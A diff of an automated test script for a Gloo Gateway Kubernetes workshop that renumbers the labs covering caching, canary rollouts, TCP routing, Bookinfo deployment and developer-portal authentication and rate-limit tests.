+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 17"; exit 1; }
 kubectl -n gloo-system create secret tls tls-secret \
   --key tls.key \
   --cert tls.crt \
@@ -2086,8 +2369,8 @@ describe("response caching", function() {
 })
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/caching/tests/caching-doesnt-apply.test.js.liquid from lab number 16"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 16"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/caching/tests/caching-doesnt-apply.test.js.liquid from lab number 18"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: gateway.solo.io/v1
 kind: HttpListenerOption
@@ -2163,8 +2446,8 @@ describe("response caching", function() {
 })
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/caching/tests/caching-applies.test.js.liquid from lab number 16"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=200 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 16"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/caching/tests/caching-applies.test.js.liquid from lab number 18"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=200 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
 kubectl --context ${CLUSTER1} -n gloo-system delete httplisteneroption cache
 helm upgrade --install argo-rollouts argo-rollouts \
   --repo https://argoproj.github.io/argo-helm \
@@ -2396,8 +2679,8 @@ describe("httpbin rollout", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 20"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
 cat <<'EOF' > ./test.js
 const chaiExec = require("@jsdevtools/chai-exec");
 var chai = require('chai');
@@ -2431,8 +2714,8 @@ describe("httproute weights for rollout canary weight 0", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 20"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
 kubectl argo rollouts --context ${CLUSTER1} -n httpbin set image httpbin1 httpbin=mccutchen/go-httpbin:v2.14.0
 echo -n Waiting for rollout to be ready...
 timeout -v 5m bash -c "until [[ \$(kubectl --context ${CLUSTER1} -n httpbin get rollout httpbin1 -ojsonpath='{.status.currentStepIndex}' 2>/dev/null) -eq 0 ]]; do
@@ -2468,8 +2751,8 @@ describe("httpbin rollout", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 20"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
 cat <<'EOF' > ./test.js
 const chaiExec = require("@jsdevtools/chai-exec");
 var chai = require('chai');
@@ -2503,8 +2786,8 @@ describe("httproute weights for rollout canary weight 0", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 20"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
 kubectl argo rollouts --context ${CLUSTER1} -n httpbin promote httpbin1
 echo -n Waiting for rollout to be ready...
 timeout -v 5m bash -c "until [[ \$(kubectl --context ${CLUSTER1} -n httpbin get rollout httpbin1 -ojsonpath='{.status.currentStepIndex}' 2>/dev/null) -eq 2 ]]; do
@@ -2541,8 +2824,8 @@ describe("httpbin rollout", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 20"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
 cat <<'EOF' > ./test.js
 const chaiExec = require("@jsdevtools/chai-exec");
 var chai = require('chai');
@@ -2576,8 +2859,8 @@ describe("httproute weights for rollout canary weight 50", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 20"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
 kubectl argo rollouts --context ${CLUSTER1} -n httpbin promote httpbin1
 echo -n Waiting for rollout to be ready...
 timeout -v 5m bash -c "until [[ \$(kubectl -n httpbin get rollout httpbin1 -ojsonpath='{.status.currentStepIndex}' 2>/dev/null) -eq 4 ]]; do
@@ -2613,8 +2896,8 @@ describe("httpbin rollout", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout.test.js.liquid from lab number 20"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
 cat <<'EOF' > ./test.js
 const chaiExec = require("@jsdevtools/chai-exec");
 var chai = require('chai');
@@ -2648,8 +2931,8 @@ describe("httproute weights for rollout canary weight 100", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 20"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
 kubectl argo rollouts --context ${CLUSTER1} -n httpbin promote httpbin1
 echo -n Waiting for rollout to be ready...
 timeout -v 5m bash -c "until [[ \$(kubectl -n httpbin get rollout httpbin1 -ojsonpath='{.status.currentStepIndex}' 2>/dev/null) -eq 5 ]]; do
@@ -2686,8 +2969,8 @@ describe("httpbin rollout", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout-final.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/rollout-final.test.js.liquid from lab number 20"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
 cat <<'EOF' > ./test.js
 const chaiExec = require("@jsdevtools/chai-exec");
 var chai = require('chai');
@@ -2721,8 +3004,8 @@ describe("httproute weights for rollout canary weight 0", () => {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 18"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 18"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/canary-rollout/tests/route-weights.test.js.liquid from lab number 20"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
 kubectl --context ${CLUSTER1} -n httpbin delete rollout httpbin1
 kubectl --context ${CLUSTER1} -n httpbin delete svc httpbin1-canary
 kubectl apply --context ${CLUSTER1} -f - <<EOF
@@ -2848,8 +3131,8 @@ describe("httpbin through TCP", () => {
   it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `http://${process.env.TCP_PROXY_IP}:8080`, path: '/get', body: 'headers', match: true }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/tcp-route/tests/tcp.test.js.liquid from lab number 19"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 19"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/tcp-route/tests/tcp.test.js.liquid from lab number 21"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
 kubectl --context ${CLUSTER1} create ns bookinfo
 kubectl --context ${CLUSTER1} -n bookinfo apply -f https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/platform/kube/bookinfo.yaml
 kubectl --context ${CLUSTER1} -n bookinfo rollout status deploy --timeout=5m
@@ -2864,8 +3147,8 @@ describe("Bookinfo app", () => {
   });
 });
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/deploy-bookinfo/tests/check-bookinfo.test.js.liquid from lab number 20"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 20"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/deploy-bookinfo/tests/check-bookinfo.test.js.liquid from lab number 22"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 22"; exit 1; }
 ./scripts/register-domain.sh bookinfo.example.com ${PROXY_IP}
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: gateway.networking.k8s.io/v1
@@ -2925,8 +3208,8 @@ describe("Access the API without authentication", () => {
   it('Checking text \'The Comedy of Errors\' in the response', () => helpersHttp.checkBody({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', body: 'The Comedy of Errors', match: true }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-no-auth.test.js.liquid from lab number 21"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-no-auth.test.js.liquid from lab number 23"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: enterprise.gloo.solo.io/v1
 kind: AuthConfig
@@ -2974,8 +3257,8 @@ describe("Access to API unauthorized", () => {
   it('Response code is 403', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', retCode: 403 }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-unauthorized.test.js.liquid from lab number 21"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-unauthorized.test.js.liquid from lab number 23"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
 export USER1_TOKEN=$(curl -Ssm 10 --fail-with-body \
   -d "client_id=${KEYCLOAK_CLIENT}" \
   -d "client_secret=${KEYCLOAK_SECRET}" \
@@ -2996,8 +3279,8 @@ describe("Access to API authorized", () => {
   it('Response code is 200', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], retCode: 200 }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-authorized.test.js.liquid from lab number 21"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-authorized.test.js.liquid from lab number 23"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: ratelimit.solo.io/v1alpha1
 kind: RateLimitConfig
@@ -3059,8 +3342,8 @@ describe("Access to API rate limited", () => {
   it('Response code is 429', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], retCode: 429 }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-rate-limited.test.js.liquid from lab number 21"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/access-api-rate-limited.test.js.liquid from lab number 23"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
 kubectl --context ${CLUSTER1} -n bookinfo annotate service productpage gloo.solo.io/scrape-openapi-source=https://raw.githubusercontent.com/istio/istio/master/samples/bookinfo/swagger.yaml --overwrite
 kubectl --context ${CLUSTER1} -n bookinfo annotate service productpage gloo.solo.io/scrape-openapi-pull-attempts="3" --overwrite
 kubectl --context ${CLUSTER1} -n bookinfo annotate service productpage gloo.solo.io/scrape-openapi-retry-delay=5s --overwrite
@@ -3078,8 +3361,8 @@ describe("APIDoc has been created", () => {
     it('APIDoc is present', () => helpers.k8sObjectIsPresent({ context: process.env.CLUSTER1, namespace: "bookinfo", k8sType: "apidoc", k8sObj: "productpage-service" }));
 });
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/apidoc-created.test.js.liquid from lab number 21"
-timeout --signal=INT 5m mocha ./test.js --timeout 10000 --retries=300 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 21"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-api/tests/apidoc-created.test.js.liquid from lab number 23"
+timeout --signal=INT 5m mocha ./test.js --timeout 10000 --retries=300 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: portal.gloo.solo.io/v1
 kind: ApiProduct
@@ -3279,8 +3562,8 @@ describe("Access the openlibrary API", () => {
   it('Checking text \'language\' in the response', () => helpersHttp.checkBody({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v2/search.json?title=The%20Comedy%20of%20Errors&fields=language&limit=1', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], body: 'language', match: true }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-stitching/tests/access-openlibrary-api.test.js.liquid from lab number 22"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 22"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-stitching/tests/access-openlibrary-api.test.js.liquid from lab number 24"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 24"; exit 1; }
 cat <<'EOF' > ./test.js
 const helpersHttp = require('./tests/chai-http');
 
@@ -3288,8 +3571,8 @@ describe("Access the openlibrary API with regex", () => {
   it('Checking text \'Rowling\' in the response', () => helpersHttp.checkBody({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v2/authors/OL23919A.json', headers: [{key: 'Authorization', value: 'Bearer ' + process.env.USER1_TOKEN}], body: 'Rowling', match: true }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-stitching/tests/access-openlibrary-api-regex.test.js.liquid from lab number 22"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 22"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-stitching/tests/access-openlibrary-api-regex.test.js.liquid from lab number 24"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 24"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: portal.gloo.solo.io/v1
 kind: ApiProduct
@@ -3436,8 +3719,8 @@ describe("Access the portal API without authentication", () => {
   it('Checking text \'apiProductMetadata\' in the response', () => helpersHttp.checkBody({ host: `https://portal.example.com`, path: '/v1/api-products', body: 'apiProductMetadata', match: true }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-backend/tests/access-portal-api-no-auth.test.js.liquid from lab number 23"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 23"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-backend/tests/access-portal-api-no-auth.test.js.liquid from lab number 25"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: v1
 kind: ServiceAccount
@@ -3571,8 +3854,8 @@ describe("Access the portal frontend with authentication", () => {
   it('Checking text \'apiProductMetadata\' in the response', () => helpersHttp.checkBody({ host: `https://portal.example.com`, path: '/v1/api-products', headers: [{ key: 'Cookie', value: cookieString }], body: 'apiProductMetadata', match: true }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/access-portal-api-auth.test.js.liquid from lab number 24"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 24"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/access-portal-api-auth.test.js.liquid from lab number 26"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 26"; exit 1; }
 cat <<'EOF' > ./test.js
 const helpersHttp = require('./tests/chai-http');
 
@@ -3588,8 +3871,8 @@ describe("Authentication is working properly", function() {
   });
 });
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/access-portal-frontend-authenticated.test.js.liquid from lab number 24"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 24"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/access-portal-frontend-authenticated.test.js.liquid from lab number 26"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 26"; exit 1; }
 cat <<'EOF' > ./test.js
 const DeveloperPortalHomePage = require('./tests/pages/dev-portal/home-page');
 const DeveloperPortalAPIPage = require('./tests/pages/dev-portal/api-page');
@@ -3664,8 +3947,8 @@ describe("Dev portal frontend UI", function () {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/dev-portal-ui-tests.test.js.liquid from lab number 24"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 24"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/dev-portal-ui-tests.test.js.liquid from lab number 26"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 26"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: portal.gloo.solo.io/v1
 kind: PortalGroup
@@ -3769,8 +4052,8 @@ describe("Dev portal frontend UI", function () {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/dev-portal-ui-tests-rbac.test.js.liquid from lab number 24"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 24"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-frontend/tests/dev-portal-ui-tests-rbac.test.js.liquid from lab number 26"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 26"; exit 1; }
 kubectl --context ${CLUSTER1} -n gloo-system delete portalgroups.portal.gloo.solo.io rbac
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: enterprise.gloo.solo.io/v1
@@ -3936,8 +4219,8 @@ describe("Dev portal frontend UI", function () {
 });
 
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/dev-portal-ui-tests.test.js.liquid from lab number 25"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/dev-portal-ui-tests.test.js.liquid from lab number 27"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=10 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 27"; exit 1; }
 export API_KEY=$(cat apiKey)
 cat <<'EOF' > ./test.js
 const helpers = require('./tests/chai-http');
@@ -3946,8 +4229,8 @@ describe("Access to API unauthorized", () => {
   it('Response code is 403', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', retCode: 403 }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-unauthorized.test.js.liquid from lab number 25"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-unauthorized.test.js.liquid from lab number 27"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 27"; exit 1; }
 cat <<'EOF' > ./test.js
 const helpers = require('./tests/chai-http');
 
@@ -3955,8 +4238,8 @@ describe("Access to API authorized", () => {
   it('Response code is 200', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'api-key', value: process.env.API_KEY}], retCode: 200 }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-authorized.test.js.liquid from lab number 25"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-authorized.test.js.liquid from lab number 27"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 27"; exit 1; }
 kubectl apply --context ${CLUSTER1} -f - <<EOF
 apiVersion: ratelimit.solo.io/v1alpha1
 kind: RateLimitConfig
@@ -4022,8 +4305,8 @@ describe("Access to API rate limited", () => {
   it('Response code is 429', () => helpers.checkURL({ host: `https://bookinfo.example.com`, path: '/api/bookinfo/v1', headers: [{key: 'api-key', value: process.env.API_KEY}], retCode: 429 }));
 })
 EOF
-echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/bookinfo/dev-portal-self-service/tests/access-api-rate-limited.test.js.liquid from lab number 25"
-timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 25"; exit 1; }
